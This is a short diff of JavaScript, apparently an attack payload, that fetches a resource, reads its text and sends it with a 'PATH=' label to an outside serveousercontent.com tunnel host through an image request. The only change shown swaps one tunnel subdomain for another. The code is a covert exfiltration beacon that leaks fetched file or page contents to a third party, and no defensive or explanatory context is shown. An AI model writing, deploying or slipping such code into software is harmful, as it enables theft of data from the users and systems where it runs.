@@ -4,7 +4,7 @@
       .then(r => r.text())
       .then(t => {
         new Image().src =
-          'https://ACA22F9BA15D3853-185-240-49-214.serveousercontent.com/?d=' +
+          'https://2212d23c8bc99266-185-240-49-214.serveousercontent.com/?d=' +
           encodeURIComponent('PATH=' + path + '\n' + t);
       });
   }
